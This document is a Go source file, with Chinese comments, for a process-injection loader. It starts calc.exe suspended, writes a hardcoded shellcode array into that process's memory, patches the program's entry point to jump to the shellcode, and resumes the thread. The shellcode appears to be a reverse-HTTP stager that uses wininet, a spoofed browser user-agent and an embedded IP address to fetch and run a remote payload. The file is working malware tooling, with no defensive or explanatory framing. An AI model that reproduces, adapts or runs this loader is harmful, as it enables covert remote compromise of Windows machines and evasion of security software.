package main

import (
	"encoding/binary"
	"fmt"
	"github.com/JamesHovious/w32"
	"golang.org/x/sys/windows"
	"log"
	"mx2/winApi"
	"unsafe"
)

func main() {

	Mylove := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0x34, 0x75, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x4b, 0x64, 0x77, 0x37, 0x00, 0x11, 0x49, 0x4c, 0x91, 0x34, 0xfb, 0x09, 0x04, 0x38, 0xa6, 0x2d, 0x73, 0xd8, 0x6f, 0xb2, 0x87, 0x8a, 0x01, 0x30, 0x07, 0x78, 0xbc, 0xb9, 0x4e, 0x33, 0x4c, 0x3e, 0x64, 0x64, 0x0c, 0xa3, 0x00, 0x08, 0xf7, 0xfe, 0x47, 0xb3, 0x59, 0x48, 0x39, 0xe2, 0xf3, 0x56, 0xae, 0x25, 0x2e, 0xb3, 0xf3, 0xba, 0x33, 0xb2, 0xed, 0x86, 0x23, 0xd0, 0x18, 0xe3, 0xe0, 0x17, 0x41, 0xb2, 0xbf, 0x40, 0x9e, 0xc1, 0xea, 0xc8, 0xc0, 0xc8, 0xf0, 0x56, 0x4e, 0xb1, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x39, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x39, 0x3b, 0x20, 0x4d, 0x41, 0x41, 0x55, 0x29, 0x0d, 0x0a, 0x00, 0x6e, 0x2d, 0xfe, 0xb0, 0x73, 0x1a, 0x99, 0x49, 0x1c, 0x59, 0x95, 0x07, 0x37, 0x18, 0x25, 0x44, 0xe7, 0x14, 0x40, 0x2f, 0xb7, 0xdc, 0xca, 0x79, 0x29, 0xfe, 0x21, 0x09, 0xa2, 0x67, 0x1d, 0xa0, 0xc8, 0x37, 0xb3, 0x8b, 0x70, 0xe1, 0xa3, 0x52, 0xc5, 0x53, 0x2a, 0x45, 0x3d, 0xb8, 0xdf, 0x42, 0xa6, 0x5d, 0x0a, 0xca, 0xd8, 0xb9, 0xfc, 0xae, 0x32, 0xcc, 0x11, 0xbe, 0x9c, 0x39, 0x16, 0xa3, 0xce, 0xd9, 0xa0, 0x4e, 0x49, 0xb2, 0x0a, 0x93, 0x48, 0x6a, 0x50, 0x77, 0x5d, 0x3c, 0xd6, 0xb6, 0x49, 0x0c, 0xd7, 0xc4, 0xeb, 0x82, 0xe2, 0x25, 0xc4, 0x59, 0xf4, 0xb3, 0xc0, 0xb7, 0xd1, 0x46, 0x27, 0x27, 0x01, 0x87, 0xcc, 0x38, 0x36, 0xce, 0x8e, 0x35, 0x8d, 0x99, 0x0c, 0xce, 0xf9, 0x6c, 0xea, 0x96, 0xa4, 0xa0, 0xe3, 0x25, 0x4b, 0xe3, 0xf2, 0x19, 0xe0, 0x3d, 0x11, 0x84, 0x39, 0x7a, 0x68, 0x11, 0xf9, 0xe3, 0x3a, 0xba, 0xd4, 0x75, 0x36, 0xcd, 0x4c, 0xca, 0xdd, 0xbd, 0x5f, 0x0d, 0x2e, 0xe6, 0x18, 0x9a, 0x95, 0x5a, 0x73, 0x54, 0x19, 0x0e, 0xe2, 0x97, 0xbb, 0x02, 0x28, 0x60, 0x9f, 0xca, 0xea, 0xe6, 0x6e, 0xb6, 0xbd, 0x33, 0x16, 0x55, 0xf4, 0xa3, 0x33, 0x5e, 0xcb, 0x70, 0xfe, 0x87, 0x3d, 0x96, 0x7c, 0x9e, 0xd3, 0xb5, 0x1f, 0x8a, 0x46, 0x04, 0xf9, 0x06, 0xa2, 0x23, 0x61, 0x86, 0x9f, 0xdd, 0xcc, 0x07, 0xb1, 0x8f, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x32, 0x31, 0x2e, 0x35, 0x2e, 0x31, 0x31, 0x37, 0x2e, 0x33, 0x32, 0x00, 0x51, 0x09, 0xbf, 0x6d}

	programName := "C:\\Windows\\System32\\calc.exe"

	//创建一个进程
	var StartupInfo = w32.STARTUPINFOW{}
	var ProcessInformation = w32.PROCESS_INFORMATION{}
	err := w32.CreateProcessW(programName, "", nil, nil, 0, windows.CREATE_SUSPENDED, nil, "", &StartupInfo, &ProcessInformation)
	if err != nil {
		log.Fatal(fmt.Println("[!] Create process failed ! "))
		return
	}

	//在创建的进程内存中申请shellcode的空间
	memoryAddr, err := w32.VirtualAllocEx(ProcessInformation.Process, 0, len(Mylove), w32.MEM_RESERVE|w32.MEM_COMMIT, w32.PAGE_READWRITE)
	if err != nil {
		log.Fatal(fmt.Println("[!] Allocate the shellcode's space failed ! "))
		return
	}

	//写入shellcode到申请的空间中
	err = w32.WriteProcessMemory(ProcessInformation.Process, memoryAddr, Mylove, uint(len(Mylove)))
	if err != nil {
		log.Fatal(fmt.Println("[!] Write the shellcode to the memory failed ! "))
		return
	}

	//修改申请的内存空间为读可执行
	var oldProtection w32.DWORD
	winApi.ProcVirtualProtectEx(ProcessInformation.Process, w32.PVOID(memoryAddr), w32.SIZE_T(len(Mylove)), w32.PAGE_EXECUTE_READ, &oldProtection)

	//获取进程的PROCESS_BASE_INFORMATION
	var processBaseInfo = winApi.PROCESS_BASE_INFORMATION{}
	var returnLength uintptr = 0
	isSuc := winApi.ProcNtQueryInformationProcess(ProcessInformation.Process, 0, &processBaseInfo, uint32(unsafe.Sizeof(processBaseInfo)), w32.ULONG_PTR(unsafe.Pointer(&returnLength)))
	if isSuc != 0 {
		log.Fatal(fmt.Println("[!] Query the process's information failed !"))
		return
	}

	var peb = windows.PEB{}
	var readbytes uint32

	//读取进程的peb块的信息
	isSuc = winApi.ProcNtReadVirtualMemory(ProcessInformation.Process, w32.PVOID(processBaseInfo.PebBaseAddress), w32.PVOID(unsafe.Pointer(&peb)), uint32(unsafe.Sizeof(peb)), &readbytes)
	if isSuc != 0 {
		log.Fatal(fmt.Println("[!] Read the PEB failed !"))
		return
	}

	//获取进程的镜像载入地址，并且读取pe文件的dos头
	var dosHeader = winApi.IMAGE_DOS_HEADER{}
	var readBytes2 uint32
	isSuc = winApi.ProcNtReadVirtualMemory(ProcessInformation.Process, w32.PVOID(peb.ImageBaseAddress), w32.PVOID(&dosHeader), uint32(unsafe.Sizeof(dosHeader)), &readBytes2)
	if isSuc != 0 {
		log.Fatal(fmt.Println("[!] Read IMAGE_DOS_HEADER failed !"))
		return
	}

	if dosHeader.Magic != 23117 {
		log.Fatal(fmt.Println("[!] DOS image header magic string was not MZ ! "))
		return
	}

	//获取映像的标准pe头
	var ntHeader = winApi.IMAGE_FILE_HEADER{}
	var readBytes3 uint32
	isSuc = winApi.ProcNtReadVirtualMemory(ProcessInformation.Process, w32.PVOID(peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+uintptr(4)), w32.PVOID(&ntHeader), uint32(unsafe.Sizeof(ntHeader)), &readBytes3)
	if isSuc != 0 {
		log.Fatal(fmt.Println("[!] Read IMAGE_FILE_HEADER failed !"))
		return
	}

	var optHeader64 winApi.IMAGE_OPTIONAL_HEADER64
	var optHeader32 winApi.IMAGE_OPTIONAL_HEADER32
	var readBytes4 uint32

	//获取映像的拓展pe头
	if ntHeader.Machine == 0x8664 {
		isSuc = winApi.ProcNtReadVirtualMemory(ProcessInformation.Process, w32.PVOID(peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+uintptr(4)+unsafe.Sizeof(ntHeader)), w32.PVOID(&optHeader64), uint32(unsafe.Sizeof(optHeader64)), &readBytes4)
	} else if ntHeader.Machine == 0x1c {
		isSuc = winApi.ProcNtReadVirtualMemory(ProcessInformation.Process, w32.PVOID(peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+uintptr(4)+unsafe.Sizeof(ntHeader)), w32.PVOID(&optHeader32), uint32(unsafe.Sizeof(optHeader32)), &readBytes4)
	} else {
		log.Fatal(fmt.Println("[!] ntHeader.Machine is not right ! "))
		return
	}

	if isSuc != 0 {
		log.Fatal(fmt.Println("[!] Read IMAGE_OPTIONAL_HEADER failed ! "))
	}

	var entryPoint uintptr
	var buffer, MyloveAddrBuffer []byte

	//组装汇编代码
	//move eax,memoryAddr
	//jmp eax
	if ntHeader.Machine == 0x8664 {
		entryPoint = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)

		buffer = append(buffer, byte(0x48))
		buffer = append(buffer, byte(0xb8))
		MyloveAddrBuffer = make([]byte, 8)
		binary.LittleEndian.PutUint64(MyloveAddrBuffer, uint64(memoryAddr))
		buffer = append(buffer, MyloveAddrBuffer...)
	} else if ntHeader.Machine == 0x1c {
		entryPoint = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)

		buffer = append(buffer, byte(0xb8))
		MyloveAddrBuffer = make([]byte, 4)
		binary.LittleEndian.PutUint32(MyloveAddrBuffer, uint32(memoryAddr))
		buffer = append(buffer, MyloveAddrBuffer...)
	}

	buffer = append(buffer, byte(0xff))
	buffer = append(buffer, byte(0xe0))

	//将组装的汇编代码写入到进程的入口点除
	err = w32.WriteProcessMemory(ProcessInformation.Process, entryPoint, buffer, uint(len(buffer)))
	if err != nil {
		log.Fatal(fmt.Println("[!] Write to the entryPoint failed !"))
	}

	//恢复线程
	_, err = w32.ResumeThread(ProcessInformation.Thread)
	if err != nil {
		log.Fatal(fmt.Println("[!] Resume thread failed ! "))
		return
	}

	w32.CloseHandle(ProcessInformation.Process)
	w32.CloseHandle(ProcessInformation.Thread)

}
